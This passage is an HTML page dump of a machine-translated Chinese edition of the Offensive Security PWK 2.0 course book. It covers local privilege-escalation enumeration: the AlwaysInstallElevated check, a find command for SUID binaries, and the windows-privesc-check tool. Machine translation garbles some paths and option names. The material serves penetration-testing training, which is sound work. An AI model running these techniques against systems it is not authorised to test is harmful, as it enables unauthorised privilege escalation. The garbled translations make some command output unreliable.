<div style="position:absolute;top:110203;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AlwaysInstallElevated REG_DWORD 0x1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110222;left:234"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 548 - 在 Windows 上查询 AlwaysInstalledElevated 注册表值</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果启用此设置，我们可以制作一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MSI</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件并运行它以提升我们的权限。</font></font></nobr></div>
<div style="position:absolute;top:110285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样，在基于 Linux 的系统上，我们可以搜索</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SUID </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">489</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件。</font></font></nobr></div>
<div style="position:absolute;top:110317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常，在运行可执行文件时，它会继承运行它的用户的权限。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:110337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果设置了 SUID 权限，二进制文件将以文件所有者的权限运行。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:110356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意味着如果二进制文件设置了 SUID 位并且文件归 root 所有，则任何本地用户都可以</font></font></nobr></div>
<div style="position:absolute;top:110376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以提升的权限执行该二进制文件。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:110511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">488 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated</font></font></font></nobr></div>
<div style="position:absolute;top:110531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">489 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://www.linux.com/tutorials/what-suid-and-how-set-suid-linuxunix/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:110659;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="94"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 94 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:110692;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:111769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:111769;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:111769;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">535</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来搜索带有 SUID 标记的二进制文件。</font><font style="vertical-align: inherit;">在这种情况下，我们开始</font></font></nobr></div>
<div style="position:absolute;top:110807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在根目录 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 中搜索，查找</font><font style="vertical-align: inherit;">设置了 SUID 位 ( </font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-perm -u=s</font></font></b><font style="vertical-align: inherit;"> ) 的</font><font style="vertical-align: inherit;">文件 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-type f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:110827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并丢弃所有错误消息（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2&gt;/dev/null</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -perm -u=s -type f 2&gt;/dev/null</font></font></font></b></nobr></div>
<div style="position:absolute;top:110879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/eject/dmcrypt-get-device</font></font></nobr></div>
<div style="position:absolute;top:110896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/openssh/ssh-keysign</font></font></nobr></div>
<div style="position:absolute;top:110912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/policykit-1/polkit-agent-helper-1</font></font></nobr></div>
<div style="position:absolute;top:110929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</font></font></nobr></div>
<div style="position:absolute;top:110946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/xorg/Xorg.wrap</font></font></nobr></div>
<div style="position:absolute;top:110963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/sbin/userhelper</font></font></nobr></div>
<div style="position:absolute;top:110980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/passwd</font></font></nobr></div>
<div style="position:absolute;top:110997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/sudo</font></font></nobr></div>
<div style="position:absolute;top:111014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/chfn</font></font></nobr></div>
<div style="position:absolute;top:111031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/newgrp</font></font></nobr></div>
<div style="position:absolute;top:111048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/pkexec</font></font></nobr></div>
<div style="position:absolute;top:111065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/gpasswd</font></font></nobr></div>
<div style="position:absolute;top:111082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/chsh</font></font></nobr></div>
<div style="position:absolute;top:111099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/挂载</font></font></nobr></div>
<div style="position:absolute;top:111116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/su</font></font></nobr></div>
<div style="position:absolute;top:111133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/fusermount</font></font></nobr></div>
<div style="position:absolute;top:111150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/卸载</font></font></nobr></div>
<div style="position:absolute;top:111167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/ntfs-3g</font></font></nobr></div>
<div style="position:absolute;top:111184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/斌/平</font></font></nobr></div>
<div style="position:absolute;top:111203;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 549 - 在 Linux 上搜索 SUID 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，该命令找到了几个 SUID 二进制文件。</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SUID</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二进制文件的</font><font style="vertical-align: inherit;">利用</font><font style="vertical-align: inherit;">将因地而异</font></font></nobr></div>
<div style="position:absolute;top:111252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在几个因素上。</font><font style="vertical-align: inherit;">例如，如果 /bin/cp（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令）是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SUID</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以复制并</font></font></nobr></div>
<div style="position:absolute;top:111271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">覆盖敏感文件，例如 /etc/passwd。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111306;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.13</font></font></i></nobr></div>
<div style="position:absolute;top:111306;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锻炼</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在您的计算机上执行本节中介绍的各种手动枚举方法</font></font></nobr></div>
<div style="position:absolute;top:111355;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专用的 Windows 和 Linux 客户端。</font><font style="vertical-align: inherit;">尝试尝试各种工具选项</font></font></nobr></div>
<div style="position:absolute;top:111375;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和本节中使用的命令。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111409;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.2</font></font></i></nobr></div>
<div style="position:absolute;top:111409;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显然，每个操作系统都包含丰富的信息，可用于进一步</font></font></nobr></div>
<div style="position:absolute;top:111466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击。</font><font style="vertical-align: inherit;">无论目标操作系统如何，手动收集这些详细信息</font></font></nobr></div>
<div style="position:absolute;top:111485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能相当耗时。</font><font style="vertical-align: inherit;">幸运的是，我们可以使用各种脚本来自动化这个过程。</font></font></nobr></div>
<div style="position:absolute;top:111518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 上，一个这样的脚本是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows-privesc-check</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">490</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在 windows-</font></font></nobr></div>
<div style="position:absolute;top:111538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">privesc 检查 Github 存储库。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">491</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储库已经包含一个 Windows 可执行文件</font></font></nobr></div>
<div style="position:absolute;top:111557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 PyInstaller 生成，但也可以根据需要重建。</font></font></nobr></div>
<div style="position:absolute;top:111590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">的可执行文件会</font><font style="vertical-align: inherit;">显示以下帮助菜单：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Tools\privilege_escalation\windows-privesc-check-master&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows-privesc-check2.exe</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111642;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:111699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">490 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Pentest Monkey，2014 年），https://github.com/pentestmonkey/windows-privesc-check</font></font></font></nobr></div>
<div style="position:absolute;top:111719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">491 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Pentest Monkey，2014 年），https://github.com/pentestmonkey/windows-privesc-check</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:111847;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="95"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 95 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:111880;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:112957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:112957;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:112957;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">536</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows-privesc-check v2.0 (http://pentestmonkey.net/windows-privesc-check)</font></font></nobr></div>
<div style="position:absolute;top:112009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：windows_privesc_check.exe (--dump [ dump opts] | --dumptab | --audit) [检查</font></font></nobr></div>
<div style="position:absolute;top:112026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项] [主机选项] -o 报告文件茎</font></font></nobr></div>
<div style="position:absolute;top:112060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:112077;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 版本    </font></font></nobr></div>
<div style="position:absolute;top:112077;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示程序的版本号并退出</font></font></nobr></div>
<div style="position:absolute;top:112094;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h, --help    </font></font></nobr></div>
<div style="position:absolute;top:112094;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此帮助信息并退出</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112111;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 倾倒    </font></font></b></nobr></div>
<div style="position:absolute;top:112111;left:303"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转储信息供您手动分析</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112128;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--转储表    </font></font></nobr></div>
<div style="position:absolute;top:112128;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以制表符分隔的格式转储信息</font></font></nobr></div>
<div style="position:absolute;top:112145;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 审计    </font></font></nobr></div>
<div style="position:absolute;top:112145;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">识别和报告安全弱点</font></font></nobr></div>
<div style="position:absolute;top:112162;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--pyshell    </font></font></nobr></div>
<div style="position:absolute;top:112162;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动交互式 python shell</font></font></nobr></div>
<div style="position:absolute;top:112196;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查选项：</font></font></nobr></div>
<div style="position:absolute;top:112213;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至少其中之一来指示要检查的内容（* = 未实现）</font></font></nobr></div>
<div style="position:absolute;top:112247;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a, --all    </font></font></nobr></div>
<div style="position:absolute;top:112247;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有简单检查（非慢速）</font></font></nobr></div>
<div style="position:absolute;top:112264;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-A, --allfiles 所有文件和目录（慢）</font></font></nobr></div>
<div style="position:absolute;top:112281;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-D，--驱动器    </font></font></nobr></div>
<div style="position:absolute;top:112281;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器</font></font></nobr></div>
<div style="position:absolute;top:112298;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e, --reg_keys 其他与安全相关的注册表项</font></font></nobr></div>
<div style="position:absolute;top:112315;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-E, --eventlogs 事件日志*</font></font></nobr></div>
<div style="position:absolute;top:112332;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f INTERESTING_FILE_LIST, --interestingfiledir=INTERESTING_FILE_LIST</font></font></nobr></div>
<div style="position:absolute;top:112349;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变化 -A 行为。</font><font style="vertical-align: inherit;">看这里</font></font></nobr></div>
<div style="position:absolute;top:112366;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-F INTERESTING_FILE_FILE, --interestingfilefile=INTERESTING_FILE_FILE</font></font></nobr></div>
<div style="position:absolute;top:112383;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变化 -A 行为。</font><font style="vertical-align: inherit;">看这里。</font><font style="vertical-align: inherit;">在目录上</font></font></nobr></div>
<div style="position:absolute;top:112400;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112417;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-G, --groups    </font></font></b></nobr></div>
<div style="position:absolute;top:112417;left:303"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">团体</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112434;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H, --shares    </font></font></nobr></div>
<div style="position:absolute;top:112434;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分享</font></font></nobr></div>
<div style="position:absolute;top:112451;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-I, --installed_software</font></font></nobr></div>
<div style="position:absolute;top:112468;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已安装的软件</font></font></nobr></div>
<div style="position:absolute;top:112485;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-j, --tasks    </font></font></nobr></div>
<div style="position:absolute;top:112485;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计划任务</font></font></nobr></div>
<div style="position:absolute;top:112501;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-k, --drivers 内核驱动程序</font></font></nobr></div>
<div style="position:absolute;top:112518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:112538;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 550 - PyInstaller 的输出可执行文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此工具接受许多选项，但我们将介绍一些快速示例。</font><font style="vertical-align: inherit;">首先，我们将列出</font></font></nobr></div>
<div style="position:absolute;top:112587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关系统上用户组的信息。</font><font style="vertical-align: inherit;">我们将指定不言自明的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--dump</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来查看</font></font></nobr></div>
<div style="position:absolute;top:112606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-G</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出组。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Tools\privilege_escalation\windows-privesc-check-master&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows-privesc-check2.exe</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:112658;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--dump -G</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows-privesc-check v2.0 (http://pentestmonkey.net/windows-privesc-check)</font></font></nobr></div>
<div style="position:absolute;top:112709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[i] TSUserEnabled 注册表值为 0。不包括 TERMINAL SERVER USER</font></font></nobr></div>
<div style="position:absolute;top:112743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑这些用户是可信的：</font></font></nobr></div>
<div style="position:absolute;top:112760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 内置\高级用户</font></font></nobr></div>
<div style="position:absolute;top:112777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 内置\管理员</font></font></nobr></div>
<div style="position:absolute;top:112794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* NT SERVICE\TrustedInstaller</font></font></nobr></div>
<div style="position:absolute;top:112811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* NT 权限\系统</font></font></nobr></div>
<div style="position:absolute;top:112845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[i] 作为当前用户运行。</font><font style="vertical-align: inherit;">未提供登录凭据（-u、-D、-p）。</font></font></nobr></div>
<div style="position:absolute;top:112861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:112878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">============ 2019-09-22 12:45:56 开始审核 ============ </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:113035;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="96"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 96 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:113068;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:114145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:114145;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:114145;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">537</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 运行：dump_misc_checks</font></font></nobr></div>
<div style="position:absolute;top:113180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 主机不在域中</font></font></nobr></div>
<div style="position:absolute;top:113197;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 检查完成</font></font></nobr></div>
<div style="position:absolute;top:113232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 运行：dump_groups</font></font></nobr></div>
<div style="position:absolute;top:113248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 转储组列表：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:113265;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Administrators 有成员：CLIENT251\Administrator</font></font></b></nobr></div>
<div style="position:absolute;top:113282;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Administrators 有成员：CLIENT251\admin</font></font></b></nobr></div>
<div style="position:absolute;top:113299;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Administrators 有成员：[unknown]\S-1-5-21-2715734670-1758985447-1278008508</font></font></b></nobr></div>
<div style="position:absolute;top:113316;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Administrators 有成员：[unknown]\S-1-5-21-2715734670-1758985447-1278008508</font></font></b></nobr></div>
<div style="position:absolute;top:113333;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Guests 有成员：CLIENT251\Guest</font></font></b></nobr></div>
<div style="position:absolute;top:113350;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\IIS_IUSRS 具有成员：NT AUTHORITY\IUSR</font></font></b></nobr></div>
<div style="position:absolute;top:113367;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Remote Desktop Users 有成员：CLIENT251\student</font></font></b></nobr></div>
<div style="position:absolute;top:113384;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Users 有成员：NT AUTHORITY\INTERACTIVE</font></font></b></nobr></div>
